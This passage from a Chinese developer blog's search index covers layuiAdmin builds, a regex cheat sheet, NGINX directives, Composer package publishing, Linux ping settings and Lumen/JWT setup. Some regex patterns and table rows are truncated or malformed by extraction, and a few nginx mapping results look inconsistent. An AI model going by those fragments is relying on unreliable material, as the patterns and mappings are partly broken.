。一个是已经实际运用的，一个是 layuiAdmin 本身的 Demo。以便从 Demo 中获取参考和提取示例。 源码构建当你在 src 目录完成开发后，你可通过 gulp 对 src 源码进行自动化构建，以生成用于线上环境的 dist 目录。其中，gulpfile.js 是 layuiAdmin 写好的任务脚本，package.json 是任务配置文件，你只需按照以下步骤： step1：确保你的电脑已经安装好了 Node.js，如果未安装，可去官网下载安装传送门 step2: 命令行安装 gulp：npm install gulp -g step3：切换到 layuiAdmin 项目根目录（即 gulpfile.js 所在目录），命令行安装任务所依赖的包：npm install 安装完成后，后续只需直接执行命令：gulp 即可完成 src 到 dist 目录的构建 关于版权 layuiAdmin 受国家计算机软件著作权保护，未经官网正规渠道授权擅自公开产品源文件、以及直接对产品二次出售的，我们将追究相应的法律责任。 获取官方正版授权： 传送门]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>ui - layuiadmin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2Farticles%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[常用正则 描述 表达式 汉字 [\u4e00-\u9fa5] 手机 ^1[3-9]\d{9}$ 移动 ^1(3[4-9]|47|5[012789]|78|8[23478])\d{8}$ 联通 ^1(3[0-2]|5[56]|8[56]|76)\d{8}$ 电信 ^1(33|53|8[019]|77)\d{8}$ 邮箱 \w[-\w.+]*@([A-Za-z0-9][-A-Za-z0-9]+.)+[A-Za-z]{2,14} IP ^((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)$ 网址 ^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-])/?$ 日期 /^(\d{4})-/(-/)*$/ 元字符下表包含了元字符的完整列表以及它们在正则表达式上下文中的行为： 字符 描述 \ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “&quot; 而 “(“ 则匹配 “(“。 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。 $ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 ? 当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。 . 匹配除换行符（\n、\r）之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像”(. (pattern) 匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(‘ 或 ‘)‘。 (?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 ( (?=pattern) 正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，”Windows(?=95 (?!pattern) 正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如”Windows(?!95 (?&lt;=pattern) 反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，”(?&lt;=95 (?&lt;!pattern) 反向否定预查，与正向否定预查类似，只是方向相反。例如”(?&lt;!95 x|y 匹配 x 或 y。例如，’z [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 [^xyz] 负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。 [a-z] 字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。 [^a-z] 负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。 \b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \B 匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \cx 匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \d 匹配一个数字字符。等价于 [0-9]。 \D 匹配一个非数字字符。等价于 [^0-9]。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 \w 匹配字母、数字、下划线。等价于’[A-Za-z0-9_]’。 \W 匹配非字母、数字、下划线。等价于 ‘[^A-Za-z0-9_]’。 \xn 匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。 \num 匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。 \n 标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。 \nm 标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。 \nml 如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。 \un 匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NGINX常用指令]]></title>
    <url>%2Farticles%2FNGINX%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[最近经常用到nginx，所以想着系统的看一下常用的指令 HttpCore指令集server_name含义：设置虚拟服务器的名字，第一个名字将成为主服务器名称；服务器名称可以使用*代替名称的第一部分或者最后一部分；也可以使用正则表达式进行捕获，目前不常用 示例 1234567891011server &#123; server_name example.com *.example.com www.example.*;&#125;# 使用正则server &#123; server_name ~^(www\.)?(.+)$; location / &#123; root /sites/$2; &#125;&#125; location含义：根据URI设置配置，可以使用合法的字符串或者正则表达式 语法：location [=||*|^~] /uri/ { … } 上下文：server 匹配符 含义 = 精确匹配 ~ 正则，大小写敏感 ~* 正则，大小写不敏感 ^~ 前缀匹配 示例 123456789101112location = /ceshi1/ &#123; proxy\_pass http://127.0.0.1:7001/xxxx; # /ceshi1 -&gt; /xxxx # /ceshi1/a -&gt; 404 Not Found # /ceshi1a -&gt; 404 Not Found&#125;location ^~ /ceshi2/ &#123; proxy\_pass http://127.0.0.1:7001/xxxx; # /ceshi2 -&gt; /xxxx # /ceshi2/a -&gt; /xxxxa # /ceshi2a -&gt; 404 Not Found&#125; 常用变量 变量名 含义 $arg_PARAMETER GET请求的参数，PARAMETER为参数名 args/query_string GET请求的query_string，比如/test?xxxx=ceshi1&amp;yyyy=ceshi2，则args_xxxx 为 ceshi1 $content_type 请求头Content-Type $cookie_COOKIE 名称为COOKIE的cookie $host 按照以下优先顺序：来自请求行的主机名，来自 Host 请求头字段的主机名，或与请求匹配的服务器名 $https 如果连接以 SSL 模式运行，则为 on，否则为空字符串 $is_args 如果请求行有参数则为 ?，否则为空字符串 $http_HEADER 获取请求头字段，注意要将中划线给为下划线，示例为http_referer $remote_addr 客户端地址 $remote_port 客户端端口 $request_method 请求方法 $request_uri 完整的原始请求URI(带参数) $scheme 请求模式，http或https $status 响应状态 document_uri 请求的url path，可能和初始不同，比如使用rewrite HttpUpstream指令集该模块用于定义可被proxy_pass等指令应用的服务器组 upstream含义：定义一组服务器，服务器可以监听不同端口。 示例 123456789101112upstream backend &#123; server backend1.example.com weight=5; server 127.0.0.1:8080 max_fails=3 fail_timeout=30s; server unix:/tmp/backend3; server backup1.example.com backup;&#125;server &#123; location / &#123; proxy_pass http://backend; &#125;&#125; 默认情况下，使用加权轮询均衡算法在服务器间分配请求。在上面的示例中，每 7 个请求将按如下方式分发：5 个请求转到 backend1.example.com，另外 2 个请求分别转发给第二个和第三个服务器。如果在与服务器通信期间发生错误，请求将被传递到下一个服务器，依此类推，直到尝试完所有正常运行的服务器。如果无法从这些服务器中获得成功响应，则客户端将接收到与最后一个服务器的通信结果。 server含义：定义服务器地址和其他参数 HttpRewrite指令集rewrite含义：根据正则表达式修改URL或者修改字符串，注意，重写表达式只对相对路径有效，如果你想匹配主机名，应该使用if语句 使用位置：server或者location或者if 语法：rewrite regex replacement flag 关于flag 值 含义 last 停止当前请求，并根据该次修改重新发起请求，然后走一遍这个配置文件 break 替换后继续往下执行指令(完成rewrite指令集) redirect 临时重定向，返回302 permanent 永久重定向，返回301 关于参数 如果不想让匹配的内容的参数附在重定向的后面，则在最后加一个问号，如下 1rewrite ^/users/(.*)$ /show?user=$1? last; 工程示例 1rewrite ./test/index.html break; # 转发所有的请求给index.html页面，并完成所有的rewrite指令集 break含义：完成所有的rewrite指令集 使用位置：server,location,if if含义：逻辑判断 使用位置：server,location 语法：if(condition){} 比较符 符号 含义 = 相等 != 不等 ~* 正则匹配，大小写不敏感 ~ 正则匹配，大小写敏感 !~* 不符合，大小写不敏感 !~ 不符合，大小写敏感 -f and !-f 判断文件存在或者不存在 -d and !-d 检测一个目录是否存在 -e and !-e 检测是否存在一个文件，一个目录或者一个符号链接 -x and !-x 检测一个文件是否可执行 示例 1234set $xsrfToken "";if ($http_cookie ~* "XSRF-TOKEN=(.+?)(?=;|$)")&#123; set $xsrfToken $1; # 设置变量xsrfToken为cookie中匹配到的值&#125; set含义：设置变量的值 使用位置(上下文)：server,location,if 示例：如上 return含义：返回一个状态值给客户端 使用位置(上下文)：server,location,if 示例： 123if ($invalid_referer) &#123; # 检测到Referers不合法，则禁止访问，返回403 return 403;&#125; HttpProxy指令集proxy_pass含义：设置代理服务器的协议、地址以及映射位置的可选URL，协议可以指定http或https，可以将地址指定为域名或IP地址，以及一个可选端口号；如果域名解析为多个地址，则所有这些地址将以轮询方式使用；可以将地址指定为upstream 使用位置: http -&gt; server -&gt; location 语法：proxy_pass URL 转发时，URI的传递方式如下 如果proxy_pass指定了URI，则转发时会将location匹配的规则部分替换为URI部分 123location /name/ &#123; proxy_pass http://127.0.0.1/remote/; # http://a.com/name/test -&gt; http://127.0.0.1/remote/test&#125; 如果proxy_pass没有指定URI，则请求URL将会以location匹配为准，示例如下 123location /xxxx &#123; proxy_pass http://127.0.0.1; # 将http://a.com/xxxx/test -&gt; http://127.0.0.1/xxxx/test&#125; 例外情况，无法确定怎么替换URI location使用正则匹配，proxy_pass不使用URI 使用rewrite，将忽略proxy_pass中的URI proxy_set_header含义：设置请求头内容 语法：proxy_set_header header value 使用位置：http,server,location 1proxy_set_header X-XSRF-TOKEN $xsrfToken; proxy_connect_timeout含义：定义与代理服务器建立连接的超时时间，注意，次超时时间通常不会超过75s 1proxy_connect_timeout 60; proxy_send_timeout含义：设置将请求传输到代理服务器的超时时间。超时时间仅作用于两个连续的写操作之间，而不是整个请求的传输过程。如果代理服务器在该时间内未收到任何内容，则关闭连接。 1proxy_send_timeout 60; proxy_read_timeout含义：定义从代理服务器读取响应的超时时间。该超时时间仅针对两个连续的读操作之间设置，而不是整个响应的传输过程。如果代理服务器在该时间内未传输任何内容，则关闭连接。 1proxy_read_timeout 60; HttpHeaders指令集add_header含义：增加响应头内容 使用位置: http -&gt; server -&gt; location 语法： add_header name value; 1add_header Cache-Control 'no-store'; # 设置所有内容不会被缓存 expires含义：增加响应头Expires字段，便于确定缓存时间 使用位置：http -&gt; server -&gt; location 语法：expires [time|epoch|max|off] 值 含义 time 数量 epoch 1 January, 1970, 00:00:01 GMT max Cache-Control值为10年，Expires为31 December 2037 23:59:59 GMT off 【默认值】不使用时间 1expires off; #不使用过期时间 注意1：优先级 强缓存优先级 &gt; 对比缓存优先级 ；对于强缓存优先级，pragma &gt; Cache-Control &gt; Expires；对于对比缓存优先级，ETag &gt; Last-Modified 注意2：Cache-Control是http1.1的头字段，Expires是http1.0的头字段，建议两者都写 注意3：Cache-Control默认值为private，其他细节不赘述 细节参考：https://www.imooc.com/article/22841 HttpReferer指令集valid_referers含义：判断请求头Referers的正确性，结果会赋值给$invalid_referer 使用位置：http -&gt; server -&gt; location 语法：valid_referers [none|blocked|server_names] 值 含义 none 无Referer，一般直接刷新会是如此 blocked 有，但是被删除，这些值不以http://或者https://开头 server_names 写一个匹配的路径规则，要带域名，会从scheme后面开始匹配，端口也会忽略，写正则以~开头 1234567location /views &#123; valid_referers *.com/chart/; #判断Referer是否匹配给出的路径，匹配则$invalid_referer为false，否则为true if ($invalid_referer) &#123; return 403; &#125;&#125;# 如果Referer为a.com/chart/1则符合规则，如果为a.com/chart则不符合，如果没有referer也不符合 附录location/proxy_pass/rewrite对比使用总结将location和proxy_pass的所有匹配情况测试结果放在下面，对应关系为【访问path -&gt; 转发成的path】 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172location /test1 &#123; proxy_pass http://127.0.0.1:7001/; # /test1 -&gt; / # /test1/a -&gt; //a # /test1a -&gt; /a&#125;location /test2 &#123; proxy_pass http://127.0.0.1:7001/xxxx; # /test2 -&gt; /xxxx # /test2/a -&gt; /xxxx/a # /test2a -&gt; /xxxxa&#125;location /test3 &#123; proxy_pass http://127.0.0.1:7001/xxxx/; # /test3 -&gt; /xxxx// # /test3/a -&gt; /xxxx//a # /test3a -&gt; /xxxx/a&#125;location /test4 &#123; proxy_pass http://127.0.0.1:7001; # /test4 -&gt; /test4 # /test4/a -&gt; /test4/a # /test4a -&gt; /xxxx4a&#125;location /test5/ &#123; proxy_pass http://127.0.0.1:7001/; # /test5 -&gt; / # /test5/a -&gt; /a # /test5a -&gt; 404 Not Found&#125;location /test6/ &#123; proxy_pass http://127.0.0.1:7001/xxxx; # /test6 -&gt; /xxxx # /test6/a -&gt; /xxxxa # /test6a -&gt; 404 Not Found&#125;location /test7/ &#123; proxy_pass http://127.0.0.1:7001/xxxx/; # /test7 -&gt; /xxxx/ # /test7/a -&gt; /xxxx/a # /test7a -&gt; 404 Not Found&#125;location /test8/ &#123; proxy_pass http://127.0.0.1:7001; # /test8 -&gt; /test8/ # /test8/a -&gt; /test8/a # /test8a -&gt; 404 Not Found&#125;location /test9/ &#123; rewrite . /b break; proxy_pass http://127.0.0.1:7001/xxxx; # /test9 -&gt; /b # /test9/a -&gt; /b # /test9a -&gt; 404 Not Found&#125;location ~* /test10(.*)/ &#123; #proxy_pass http://127.0.0.1:7001/xxxx; # nginx无法执行通过，会报错，不能带URI&#125;location = /ceshi1/ &#123; proxy_pass http://127.0.0.1:7001/xxxx; # /ceshi1 -&gt; /xxxx # /ceshi1/a -&gt; 404 Not Found # /ceshi1a -&gt; 404 Not Found&#125;location ^~ /ceshi2/ &#123; proxy_pass http://127.0.0.1:7001/xxxx; # /ceshi2 -&gt; /xxxx # /ceshi2/a -&gt; /xxxxa # /ceshi2a -&gt; 404 Not Found&#125;]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP发布自己的composer包]]></title>
    <url>%2Farticles%2FPHP%E5%8F%91%E5%B8%83%E8%87%AA%E5%B7%B1%E7%9A%84composer%E5%8C%85%2F</url>
    <content type="text"><![CDATA[1. 准备工作注册 Github 账号 ： https://github.com/注册 Packagist 账号 ： https://packagist.org/ (可以使用github账户登录) 2. 添加git仓库2.1 创建 Github 仓库 并按要求填写信息 2.2 克隆到本地1git clone https://github.com/gouyuwang/lumen.git 2.3 初始化composer.json1composer init 接下来全部回车 （如果有依赖，则按需求搜索依赖包） 或者手动创建composer.json文件 12345678910111213141516171819202122232425262728&#123; "name": "gouyuwang/lumen", "description": "lumen helper", "type": "library", "license": "MIT", "authors": [ &#123; "name": "gouyuwang", "email": "529156563@qq.com" &#125; ], # 如果你的数据需要加上PHP版本，并加入了src目录 需要追加下面配置 "require": &#123; "php": "&gt;=7.0", "php-curl-class/php-curl-class": "^7.2" &#125;, "require-dev": &#123; "composer/composer": "^1.2", "friendsofphp/php-cs-fixer": "~2", "phpunit/phpunit": "^4.8.35 || ^5.7", "php-curl-class/php-curl-class": "^7.2" &#125;, "autoload": &#123; "psr-4": &#123; "gouyuwang\\lumen\\": "src/" &#125; &#125;&#125; 2.4 初始化 .gitignore文件内容 1/vendor/ 2.5 业务逻辑12345678910111213&lt;?phpnamespace gouyuwang\lumen;class Response&#123; public static function echo ( $text) &#123; header("Content-type:text/html"); echo $text; exit; &#125; &#125; 注意：PHP文件书写几个要点 文中出现的不管是系统还是依赖的class 都必须开头使用 use 引入 命名空间是你的项目名称对应的目录 [git-username]/[文件目录] 代码放入src 类名与文件名最好相同 2.6 文件目录结构 3. 上传至git如果有sourcetree 可以忽略下面的提交命令 3.1 提交12345git initgit add .git commit -m "first commit"git remote add origin gouyuwang@github.com:gouyuwang/lumen.gitgit push origin master 3.2 打tag为什么要打tag？ tag相当于你的项目到了一个新的阶段，不再是开发版，否则使用 1composer require gouyuwang/lumen @dev #其中 `@dev` 必不可少 查看最新提交的版本号 1git log --oneline --decorate --graph 打tag 123git tag v1.1 61d974a // 在某个commit 上打taggit push origin test_tag // 提交到线上库 删除 tag 123git tag -d v1.1 // 删除某个commit 上的taggit push origin :refs/tags/v1.1 // 提交到线上库 4. 提交packageist访问并登陆：https://packagist.org 点击右上角的 submit , 输入你的git地址 ： https://github.com/gouyuwang/lumen.git 点击 check, 完成后点击 submit 即提交完成 5. 检出依赖包1composer require gouyuwang/lumen 如果报错： 12[InvalidArgumentException]Could not find a version of package gouyuwang/lumen matching your minimum-stability (stable). Require it with an explicit version constraint allowing its desired stability. 可能是你的tag没打成功，或者打成功后，并没有同步到国外服务器，请耐心等待 替代方案： 1composer require gouyuwang/lumen @dev 现在你可以在项目中使用你写的依赖库了]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux禁止ping以及开启ping的方法]]></title>
    <url>%2Farticles%2FLinux%E7%A6%81%E6%AD%A2ping%E4%BB%A5%E5%8F%8A%E5%BC%80%E5%90%AFping%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Linux默认是允许Ping响应的，系统是否允许Ping由内核参数、防火墙2个因素决定的，需要2个因素同时允许才能允许Ping，2个因素有任意一个禁Ping就无法Ping。 具体的配置方法如下： 一、内核参数设置icmp_echo_ignore_all : 0表示允许，1表示禁止 临时允许PING操作的命令 1&gt; echo 0 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all 永久允许PING配置方法。 /etc/sysctl.conf 中增加一行 1net.ipv4.icmp_echo_ignore_all=0 如果已经有net.ipv4.icmp_echo_ignore_all这一行了，直接修改值即可。 禁止Ping的方法类似，只需要设置icmp_echo_ignore_all=1即可 修改完成后执行sysctl -p使新配置生效。 二、防火墙设置（注：此处的方法的前提是内核配置是默认值，也就是没有禁止Ping） 这里以iptables防火墙为例，其他防火墙操作方法可参考防火墙的官方文档。 允许PING设置 123iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPTiptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT 或者也可以临时停止防火墙操作的。 1service iptables stop 禁止PING设置 1iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP]]></content>
  </entry>
  <entry>
    <title><![CDATA[Lumen项目整合]]></title>
    <url>%2Farticles%2FLumen%E9%A1%B9%E7%9B%AE%E6%95%B4%E5%90%88%2F</url>
    <content type="text"><![CDATA[一、安装通过 Lumen 安装器首先，使用 Composer 下载 Lumen 安装包： 1composer global require &quot;laravel/lumen-installer&quot; 请确保你已将 ~/.composer/vendor/bin 路径添加到环境变量 PATH 中，只有这样系统才能找到 lumen 的可执行文件。如何让安装Composer? 一旦安装完成，使用 lumen new 将会在您指定的目录中创建一个新的Lumen 项目。例如： lumen new blog 命令将会创建一个名字叫 blog 的目录 ，此目录里面存放着新安装的 Lumen 和代码依赖。这个方法的安装速度比通过 Composer 安装要快很多： 1lumen new blog 此方法的缺点也很明显，无法安装指定的lumen版本.需要安装指定版本的Lumen可参考下面的方法. 通过 Composer Create-Project 命令安装你也可以在你电脑的终端输入 create-project 命令来安装 Lumen ： 1composer create-project laravel/lumen blog --prefer-dist &quot;5.2.*&quot; 二、项目目录在lumen 基础上添加了 Models 目录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/|-- app 项目应用目录| |-- Console 自定义的 Artisan 命令| |-- |-- Kernel.php 注册自定义的 Artisan 命令以及定义调度任务| |-- Events 存放事件类| |-- Extends 存放自定义扩展，例如Excel导出等| |-- Exceptions 异常处理| | |-- Handler.php 处理应用抛出的异常| |-- helpers.php 自定义函数方法| |-- Http 主程序| | |-- Middleware 中间件| | |-- Controllers 控制器| | | |-- Admin 后台目录| | | |-- V1 V1版本| | | |-- Logic 业务逻辑| | | |-- Api 前台目录| | | |-- V1 V1版本| | | |-- Logic 业务逻辑| | | |-- Pub 公共目录| | | |-- V1 V1版本| | |-- Logic 业务逻辑| | |-- Controller.php 版本父级控制层| | |-- Logic.php 版本父级逻辑层| |-- Jobs 队列任务| |-- Listeners 事件监听器| |-- Providers 服务提供| |-- Models 数据模型目录 |-- bootstrap 自动加载配置 | |-- app.php 启动、自动加载配置|-- config 所有应用配置文件| |-- auth.php auth授权配置| |-- cors.php cors跨域配置| |-- database.php database配置|-- database 数据迁移、填充文件|-- public Web站点根目录|-- resources 视图、原生资源文件| |-- lang 语言目录|-- routes 路由配置文件| |-- admin 后台管理路由配置| |-- admin.php | |-- api 前台路由配置| |-- api.php | |-- pub 公共路由配置| |-- pub.php |-- storage 缓存、框架生成文件| |-- app 存放应用生成的文件| |-- framework 框架生成的文件或缓存| |-- logs 日志文件|-- tests 自动化测试|-- vendor Composer依赖文件|-- .env 配置文件|-- .env.example 配置文件备份 |-- composer.json\ 三、 数据模型3.1 命名规范数据模型相关的命名规范： 数据模型类名 必须 为「单数」, 如：App\Models\Photo 类文件名 必须 为「单数」，如：app/Models/Photo.php 数据库表名字 必须 为「复数」，多个单词情况下使用「Snake Case」 如：photos, my_photos 数据库表迁移名字 必须 为「复数」，如：2014_08_08_234417_create_photos_table.php 数据填充文件名 必须 为「复数」，如：PhotosTableSeeder.php 数据库字段名 必须 为「Snake Case」，如：view_count, is_vip 数据库表主键 必须 为「id」 数据库表外键 必须 为「resource_id」，如：user_id, post_id 数据模型变量 必须 为「resource_id」，如：$user_id, $post_id 3.1 Mysql模型在app目录下创建数据模型 Models 在数据模型开头修改命名空间 12345678# 在app根目录的数据模型 命名空间为：namespace App;#修改为命名空间为namespace App\Models;#使用 Models下的User模型use App\Models\User; 其他目录的添加同上，只是在命名空间上做修改。 123456789101112131415161718&lt;?phpnamespace App\Models;use App\Extend\TraitDbEloquent;use Illuminate\Database\Eloquent\Model;class BaseModel extends Model&#123; use TraitDbEloquent; // default db protected $connection = 'mysql'; public function __construct() &#123; parent::__construct(); &#125;&#125; 3.2 Mongo模型1234567891011121314151617181920212223namespace App\Mongo;use App\Extend\TraitDbEloquent;use Jenssegers\Mongodb\Eloquent\Model as Eloquent;class BaseModel extends Eloquent&#123; use TraitDbEloquent; // primary key protected $primaryKey = "_id"; // primary key type protected $keyType = "string"; // default db protected $connection = 'mongodb'; public function __construct() &#123; parent::__construct(); &#125;&#125; 其中 TraitDbEloquent 封装了数据库CURD操作。 四、统一输出在helpers.php中统一处理输出模块， 123456789101112131415161718/** * 统一输出 * @param int $code * @param string $msg * @param array $data * @return array */function format_return($code, $msg = null, $data = null)&#123; $res = [ 'code' =&gt; $code, 'msg' =&gt; is_null($msg) ? trans("reponse.$code") : $msg ]; if (!is_null($data)) &#123; $res['data'] = $data; &#125; return $res;&#125; 其中trans定义了状态信息，放在 ./resources/lang/文件，方便支持多语言 123456789101112131415// zh-CN/reponse.php 中文简体&lt;?phpreturn [ 2000 =&gt; '请求成功', 4000 =&gt; '请求失败',];//en/reponse.php 英文&lt;?phpreturn [ 2000 =&gt; 'ok', 4000 =&gt; 'fail',]; 五、 JWT配置5.1 安装通过composer安装jwt-auth 1composer require tymon/jwt-auth &quot;1.*&quot; 注意：jwt-auth 0.5.* 版本未对lumen做封装 5.2 修改自动加载配置 文件 bootstrap/app.php 去掉 $app-&gt;withFacades() $app-&gt;withEloquent() 的注释 添加 jwt 接口 12345678//使用 Facades 静态类$app-&gt;withFacades(true,[ 'Tymon\JWTAuth\Facades\JWTAuth' =&gt; 'JWTAuth', 'Tymon\JWTAuth\Facades\JWTFactory' =&gt; 'JWTFactory']);$app-&gt;withEloquent(); //使用 Eloquent ORM 去掉 auth 中间件 注释 1234//auth 中间件 $app-&gt;routeMiddleware([ 'auth' =&gt; App\Http\Middleware\Authenticate::class, ]); 去掉appServiceProvider的注释，并且在 AppServiceProvider 中注册 LumenServiceProvider 123$app-&gt;register(App\Providers\AppServiceProvider::class);$app-&gt;register(App\Providers\AuthServiceProvider::class); $app-&gt;register(\Tymon\JWTAuth\Providers\LumenServiceProvider::class); 5.3 jwt配置 获取 auth 配置文件在 lumen 根目录下 创建 config 文件夹 （laravel 框架 自动加载 config 文件夹的内容），并将 vendor/laravel/lumen-framework/config 中的 auth.php 文件复制到刚刚创建的config文件夹中。修改 auth.php 文件，将 api 认证指定为 jwt，并绑定users 数据模型 12345678910111213141516171819//原 'guards' =&gt; [ 'api' =&gt; ['driver' =&gt; 'api'], ],//修改为： 'guards' =&gt; [ 'api' =&gt; ['driver' =&gt; 'jwt'], 'provider' =&gt; 'users' ],//指定数据模型 'providers' =&gt; [ 'users' =&gt; [ 'driver' =&gt; 'eloquent', 'model' =&gt; \App\Models\User::class, ], ], JWT 协议需要用到 secret，所以需要生成一个 secret，在根目录下 执行命令 123php artisan jwt:secret//执行成功返回如下jwt-auth secret [Y] set successfully. 执行成功后，会把生成的secret写入 .env 文件中并配置jwt token 的三个时间 1234567JWT_SECRET=xxxxxxxxxx//有效时间 单位：分钟JWT_TTL = 60//刷新时间 单位：分钟 默认 14天 JWT_REFRESH_TTL = 20160//宽限时间 单位：秒JWT_BLACKLIST_GRACE_PERIOD = 60 作者更喜欢使用这个JWT扩展类 https://github.com/firebase/php-jwt 六、异步事件处理在很多场景中我们需要某些特定函数后台运行，例如 访问量+1 、发送短信通知、日志存储等，同步的做法是在业务逻辑执行完成以后，在执行文件末尾添加 相关的访问量统计等方法。 这对程序的效率是由很大的影响的，采用异步处理可以有效处理此类业务场景。lumen提供了 events 事件处理机制。以日志监控为例，我们需要对用户请求、程序响应记录在日志服务器上面，这一块我们只需要在Middleware中拦截入口流量和出口流量，记录即可。代码如下： 注册EventServiceProvider 12// Event$app-&gt;register(App\Providers\EventServiceProvider::class); 中间件流量拦截 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace App\Http\Middleware;use App\Events\MonitorEvent;use Closure;class Monitor&#123; /** * Handle an incoming request. * * @param \Illuminate\Http\Request $request * @param \Closure $next * @param string|null $guard * * @return mixed */ public function handle($request, Closure $next, $guard = null) &#123; // 开始计时 $start = microtime(true); // 执行业务 $response = $next($request); // 结束计时 $end = microtime(true); // 流量监控 if (ENV('OPEN_TRAFFIC_MONITOR', true)) &#123; $params = [ 'ip' =&gt; $request-&gt;getClientIp(), 'host' =&gt; $request-&gt;getHost(), 'route' =&gt; $request-&gt;path(), 'method' =&gt; $request-&gt;method(), 'header' =&gt; $request-&gt;header(), 'params' =&gt; limit_var_size($request-&gt;all(), 1024), 'response' =&gt; limit_var_size($response-&gt;getOriginalContent(), 1024), 'require_time' 